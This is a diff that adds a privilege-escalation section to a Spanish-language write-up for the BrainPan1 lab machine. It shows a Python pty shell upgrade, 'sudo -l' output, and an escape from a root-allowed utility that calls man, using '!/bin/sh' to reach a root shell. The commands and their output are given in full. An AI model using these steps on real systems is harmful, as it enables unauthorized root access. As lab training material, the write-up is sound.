@@ -265,9 +265,50 @@ s.close()
 <img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain9.jpg" width="60%"></img>
 
 
+### Consola Interactica
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
 
+### Escalar Privilegios con SUDO
+https://laptrinhx.com/linux-privilege-escalation-exploiting-sudo-rights-part-i-3008456094/
 
+```
+puck@brainpan:/home/puck$ sudo -l
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+```
+- El usuario puck puede ejecutar el archivo "/home/anansi/bin/anansi_util" sin solicitar credenciales a través de SUDO.
 
-
+```
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+```
+- Ejecutarmos /bin/sh
+```
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual 
+sudo /home/anansi/bin/anansi_util manual 
+No manual entry for manual
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual /bin/sh
+sudo /home/anansi/bin/anansi_util manual /bin/sh
+/usr/bin/man: manual-/bin/sh: No such file or directory
+/usr/bin/man: manual_/bin/sh: No such file or directory
+No manual entry for manual
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/sh
+!/bin/sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
